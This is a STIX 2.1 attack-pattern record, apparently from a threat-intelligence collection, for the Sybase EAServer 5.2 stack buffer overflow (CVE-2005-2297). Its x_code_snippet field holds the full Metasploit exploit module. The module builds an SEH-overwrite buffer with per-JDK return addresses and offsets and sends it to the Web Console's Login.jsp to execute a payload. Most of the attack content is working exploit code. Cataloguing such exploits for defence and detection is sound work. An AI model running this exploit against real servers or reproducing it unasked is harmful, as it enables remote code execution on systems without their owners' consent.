{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--78e8ab98-3e38-430b-ab73-f7690db0e11f",
    "created": "2024-08-14T16:54:59.987993Z",
    "modified": "2024-08-14T16:54:59.987997Z",
    "name": "Sybase EAServer 5.2 Remote Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Sybase EAServer Web Console. The offset to the SEH frame appears to change depending on what version of Java is in use by the remote server, making this exploit somewhat unreliable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sybase_easerver.rb",
            "external_id": "sybase_easerver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2297"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sybase EAServer 5.2 Remote Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Sybase EAServer Web\n        Console. The offset to the SEH frame appears to change depending\n        on what version of Java is in use by the remote server, making this\n        exploit somewhat unreliable.\n      },\n      'Author'         => [ 'Unknown' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2297' ],\n          [ 'OSVDB', '17996' ],\n          [ 'BID', '14287'],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    \t=> 1000,\n          'BadChars' \t=> \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\\\$\\%\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Technically we could combine these into a single multi-return string...\n          ['Windows All - Sybase EAServer 5.2 - jdk 1.3.1_11', {'Ret' => 0x6d4548ff, 'Offset' => 3820}],\n          ['Windows All - Sybase EAServer 5.2 - jdk 1.3.?.?',  {'Ret' => 0x6d4548ff, 'Offset' => 3841}],\n          ['Windows All - Sybase EAServer 5.2 - jdk 1.4.2_06', {'Ret' => 0x08041b25, 'Offset' => 3912}],\n          ['Windows All - Sybase EAServer 5.2 - jdk 1.4.1_02', {'Ret' => 0x08041b25, 'Offset' => 3925}],\n        ],\n      'DisclosureDate' => '2005-07-25'))\n\n    register_options(\n      [\n        OptString.new('DIR', [ true, \"Directory of Login.jsp script\", '/WebConsole/' ]),\n        Opt::RPORT(8080)\n      ])\n  end\n\n  def exploit\n\n    print_status( \"Attempting to exploit...\")\n\n    # Building the evil buffer\n    crash = rand_text_alphanumeric(5000, payload_badchars)\n    crash[ target['Offset'] - 4, 2 ] = \"\\xeb\\x06\"\n    crash[ target['Offset']    , 4 ] = [target.ret].pack('V')\n    crash[ target['Offset'] + 4, payload.encoded.length ] = payload.encoded\n\n    # Sending the request\n    res = send_request_cgi({\n      'uri'       => normalize_uri(datastore['DIR'], 'Login.jsp'),\n      'method'    => 'GET',\n      'encode_params' => false,\n      'headers'   => {\n        'Accept' => '*/*',\n      },\n      'vars_get'  => {\n        crash => nil\n      }\n    }, 5)\n\n    print_status(\"Overflow request sent, sleeping for four seconds\")\n    select(nil,nil,nil,4)\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-07-25",
    "x_mitre_platforms": [
        "win'"
    ]
}